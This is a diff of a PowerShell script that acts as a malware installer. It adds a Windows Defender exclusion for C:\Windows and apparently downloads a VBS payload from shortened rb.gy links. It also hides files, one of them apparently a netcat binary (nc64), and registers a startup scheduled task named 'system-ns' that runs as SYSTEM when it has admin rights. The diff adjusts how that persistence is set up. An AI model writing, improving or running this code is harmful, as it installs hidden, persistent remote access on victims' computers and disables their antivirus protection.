@@ -1,18 +1,24 @@
 # Check if the script is running as an Administrator
-$isAdmin = ([Security.Principal.WindowsPrincipal]::New([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if ($isAdmin) {
     Write-Output "Running as Administrator"
+
+    # Admin rights detected
     $installPath = "C:\Windows"
     $scriptVbsUrl = "https://rb.gy/w3a7hb"
+
+    # Windows Defender Exclusion
     Add-MpPreference -ExclusionPath $installPath
 } else {
     Write-Output "Not running as Administrator"
+
+    # No admin rights
     $installPath = Join-Path $env:USERPROFILE "System"
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
-# Create the installation directory if it doesn’t exist
+# Create the installation directory if it doesn't exist
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
@@ -36,27 +42,32 @@ attrib +H $quietTxtPath
 attrib +H $nc64TxtPath
 attrib +H $scriptVbsPath
 
-# Create a scheduled task
+# Define task parameters
+$taskName = "system-ns"
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
-    $taskName = "system-ns"
-    $taskPath = "\MyTasks\"  # Custom subfolder for non-admin users
-
     if ($isAdmin) {
-        # Admin: Register in root with SYSTEM account
+        # If admin rights, run as NT AUTHORITY\SYSTEM using PowerShell
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath "\" -Principal $principal -Settings $settings -Force
-        Start-ScheduledTask -TaskName $taskName -TaskPath "\"
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+        Start-ScheduledTask -TaskName $taskName
     } else {
-        # Non-Admin: Register in custom subfolder with current user
-        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath $taskPath -Principal $principal -Settings $settings -Force
-        Start-ScheduledTask -TaskName $taskName -TaskPath $taskPath
+        # If not admin, use CMD to run schtasks /create
+        $tr = "wscript.exe \`"$scriptVbsPath\`""
+        cmd /c "schtasks /create /tn $taskName /tr $tr /sc ONSTART /ru $env:USERNAME /it /f"
+        
+        # Check if task creation succeeded
+        if ($LASTEXITCODE -eq 0) {
+            # Apply additional settings using PowerShell
+            Set-ScheduledTask -TaskName $taskName -Settings $settings
+            Start-ScheduledTask -TaskName $taskName
+        } else {
+            Write-Output "Failed to create the scheduled task with schtasks, exit code: $LASTEXITCODE"
+        }
     }
-    Write-Output "Task registered and started successfully."
 } catch {
-    Write-Output "Failed to register or start the scheduled task: $_"
+    Write-Output "Failed to register, set, or start the scheduled task: $_"
 }
